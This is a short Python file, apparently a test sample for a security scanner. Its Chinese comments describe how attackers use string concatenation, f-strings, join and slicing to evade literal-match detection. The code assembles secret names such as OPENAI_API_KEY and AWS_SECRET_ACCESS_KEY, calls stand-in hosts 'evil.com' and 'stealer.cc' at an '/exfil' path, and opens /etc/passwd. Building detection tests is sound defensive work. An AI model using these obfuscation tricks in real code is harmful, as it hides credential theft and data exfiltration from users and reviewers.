#!/usr/bin/env python3
"""
evasion-03-string-concat.py — 字符串拼接/格式化
攻击者通过拼接/格式化绕过字面量匹配
"""

import os, requests

# 字符串拼接
k1 = "OPENAI_" + "API_KEY"            # 逃逸：IDE 中不显示完整字符串
k2 = "AWS_" + "SECRET_" + "ACCESS_KEY"
requests.get("https://" + "evil" + ".com")  # 逃逸：域名拼接

# f-string / format
domain = f"stealer.{'c'}{'c'}"           # 逃逸：f-string 构造
requests.get(f"https://{domain}/exfil")

# join 构造
parts = ["/etc", "passwd"]               # 逃逸：join 构造路径
open("/".join(parts))

# 切片混淆
full = "SAFE_OPENAI_API_KEY_SAFE"        # 逃逸：切片提取子串
real = full[5:-5]
os.environ.get(real)
